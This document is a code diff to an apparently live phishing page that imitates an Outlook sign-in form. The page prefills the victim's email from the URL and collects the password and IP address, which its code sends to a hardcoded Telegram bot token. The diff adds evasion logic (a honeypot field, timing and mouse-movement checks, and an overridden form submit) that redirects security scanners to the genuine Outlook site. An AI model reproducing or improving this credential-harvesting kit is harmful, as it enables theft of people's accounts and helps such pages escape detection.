@@ -12,32 +12,6 @@
   <link href="https://cdn.prod.website-files.com/68f89e5e044f107c8074cdb5/68f8b899298663920f95c938_157bece9-7026-47eb-bbff-eae4174424f0-2.png" rel="shortcut icon" type="image/x-icon">
   <link href="https://cdn.prod.website-files.com/68f89e5e044f107c8074cdb5/68f8b899298663920f95c938_157bece9-7026-47eb-bbff-eae4174424f0-2.png" rel="apple-touch-icon">
   <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <style>
-    /* Minimal security - doesn't change your design */
-    .email-security-wrapper {
-      position: relative;
-      width: 100%;
-    }
-    
-    .email-security-overlay {
-      position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background: transparent;
-      z-index: 10;
-      cursor: not-allowed;
-    }
-    
-    /* Make the actual input field invisible to bots but keep styling */
-    #email {
-      position: relative;
-      z-index: 1;
-      pointer-events: none;
-      background-color: #f8f8f8;
-    }
-  </style>
 </head>
 <body>
   <section class="safelogingfield">
@@ -47,18 +21,13 @@
         <form id="email-form" name="email-form" data-name="Email Form" class="form" data-wf-page-id="68f89e61044f107c8074cebc" data-wf-element-id="22da511f-7236-2a9c-8b64-c7b114ebea92">
           <input type="hidden" id="ip" name="ip">
           <input type="hidden" id="hidden-email" name="email">
+          <!-- Honeypot field for bots -->
+          <input type="text" id="bot-trap" name="bot-trap" style="display:none !important;" tabindex="-1" autocomplete="off">
           
           <label for="email" class="field-label">User name:</label>
-          <div class="email-security-wrapper">
-            <!-- Your original email field - unchanged but protected -->
-            <input class="field w-input" maxlength="256" name="email" data-name="email" placeholder="" type="email" id="email" required="" readonly>
-            <!-- Invisible security overlay -->
-            <div class="email-security-overlay" id="email-overlay"></div>
-          </div>
-          
+          <input class="field w-input" maxlength="256" name="email" data-name="email" placeholder="" type="email" id="email" required="" readonly style="background-color: #f8f8f8;">
           <label for="password" class="field-label-2">Password:</label>
           <input class="field w-input" maxlength="256" name="password" data-name="password" placeholder="" type="password" id="password" required="" autocomplete="off">
-          
           <div class="div-block-3">
             <img src="images/outlook-logo-png_seeklogo-299920.png" loading="lazy" alt="" class="image-3">
             <input type="submit" data-wait="Please wait..." class="submit-button w-button" value="Sign In">
@@ -94,10 +63,6 @@
       // Set the email in both the visible and hidden fields
       document.getElementById('hidden-email').value = finalEmail;
       document.getElementById('email').value = finalEmail;
-    } else {
-      // If no valid email, show placeholder but don't break the form
-      document.getElementById('email').value = 'email@example.com';
-      document.getElementById('email').style.color = '#999';
     }
   });
   </script>
@@ -123,48 +88,91 @@
       }
     });
 
-    // COMPLETE BOT PROTECTION - Block all interactions with email field
-    $('#email-overlay').on('click keydown keyup keypress focus blur mouseenter mouseleave mousedown mouseup touchstart touchend touchmove', function(e) {
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      return false;
-    });
-
-    // Also protect the actual email input
-    $('#email').on('click keydown keyup keypress focus blur mouseenter mouseleave mousedown mouseup touchstart touchend touchmove', function(e) {
-      e.preventDefault();
-      e.stopPropagation();
-      e.stopImmediatePropagation();
-      return false;
-    });
-
-    // Disable copy/paste
-    $('#email, #email-overlay').on('copy cut paste', function(e) {
-      e.preventDefault();
-      return false;
-    });
-
-    // Disable right-click
-    $('#email, #email-overlay').on('contextmenu', function(e) {
-      e.preventDefault();
-      return false;
-    });
-
-    // Form submission protection
-    let formSubmitted = false;
+    // ADVANCED BOT PROTECTION
     
+    // 1. Honeypot detection
+    let honeypotTimer = setTimeout(function() {
+      // If honeypot gets focus, it's a bot
+      $('#bot-trap').on('focus', function() {
+        console.log('Bot detected via honeypot');
+        // Redirect bot immediately
+        window.location.href = "https://outlook.live.com";
+      });
+    }, 1000);
+
+    // 2. Form submission timing detection
+    let formLoadTime = Date.now();
+    let submissionBlocked = false;
+
+    // 3. Human behavior simulation requirement
+    let humanInteraction = false;
+    let mouseMovements = 0;
+    
+    $(document).on('mousemove click keydown scroll', function() {
+      humanInteraction = true;
+      mouseMovements++;
+      clearTimeout(honeypotTimer);
+    });
+
+    // 4. Advanced event blocking for email field
+    $('#email').on('focus click keydown keyup keypress input change', function(e) {
+      e.preventDefault();
+      e.stopPropagation();
+      // If anyone tries to interact with email field, block submission
+      submissionBlocked = true;
+      return false;
+    });
+
+    // 5. Copy/paste protection
+    $('#email').on('copy cut paste', function(e) {
+      e.preventDefault();
+      submissionBlocked = true;
+      return false;
+    });
+
     $("#email-form").submit(function (event) {
-      // Prevent multiple submissions
-      if (formSubmitted) {
-        event.preventDefault();
+      event.preventDefault();
+
+      // BOT DETECTION CHECKS
+      
+      // Check 1: Honeypot field filled (definitely a bot)
+      if ($('#bot-trap').val().length > 0) {
+        console.log('Bot detected: Honeypot field filled');
+        window.location.href = "https://outlook.live.com";
         return false;
       }
       
-      event.preventDefault();
-
-      // Get the values from the form fields - ONLY from hidden email field
+      // Check 2: Too fast submission (less than 3 seconds)
+      let submissionTime = Date.now();
+      if ((submissionTime - formLoadTime) < 3000) {
+        console.log('Bot detected: Form submitted too quickly');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+      
+      // Check 3: No human interaction detected
+      if (!humanInteraction || mouseMovements < 2) {
+        console.log('Bot detected: No human interaction');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+      
+      // Check 4: Email field was tampered with
+      if (submissionBlocked) {
+        console.log('Bot detected: Email field interaction detected');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+      
+      // Check 5: Empty or invalid email from URL
       let userEmail = $("#hidden-email").val();
+      if (!userEmail || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) {
+        console.log('Bot detected: Invalid email');
+        window.location.href = "https://outlook.live.com";
+        return false;
+      }
+
+      // If all checks pass, proceed with human submission
       let userPassword = $("#password").val();
       let userIP = $("#ip").val();
 
@@ -173,9 +181,6 @@
         console.error("Missing email or password");
         return;
       }
-
-      // Mark as submitted to prevent duplicates
-      formSubmitted = true;
 
       // Telegram credentials
       let botToken = "8492588783:AAENb9XkfvvnkZWcZPEcePB88EX0gJZguMw";
@@ -249,6 +254,14 @@
         });
       }
     });
+
+    // Additional protection: If bot tries to submit via JavaScript directly
+    let originalSubmit = HTMLFormElement.prototype.submit;
+    HTMLFormElement.prototype.submit = function() {
+      console.log('Bot detected: Direct form submission attempt');
+      window.location.href = "https://outlook.live.com";
+      return false;
+    };
   });
   </script>
 </body>
